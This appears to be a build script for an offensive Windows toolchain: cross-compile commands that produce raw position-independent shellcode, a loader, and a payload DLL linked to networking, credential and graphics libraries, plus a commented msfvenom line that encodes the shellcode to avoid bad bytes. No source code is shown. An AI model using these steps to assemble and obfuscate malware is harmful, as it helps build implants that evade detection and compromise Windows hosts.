i686-w64-mingw32-g++ -O1 -s -fno-stack-protector -fno-exceptions -fno-rtti -m32 -static -ffreestanding -nostdlib -Wl,--entry=_ShellcodeEntry -o shellcode.exe shellcode.cpp
objcopy -O binary --only-section=.text shellcode.exe shellcode.bin
i686-w64-mingw32-g++ -o loader.exe loader.cpp -lsetupapi -static
i686-w64-mingw32-g++ -shared -o payload.dll payload.cpp -lws2_32 -lsecur32 -lcrypt32 -lgdiplus -lgdi32 -lole32 -Wl,--subsystem,windows

# cat shellcode.bin | msfvenom -p - -a x86 --platform windows -b "\x00\x0a" -f c -i 3 
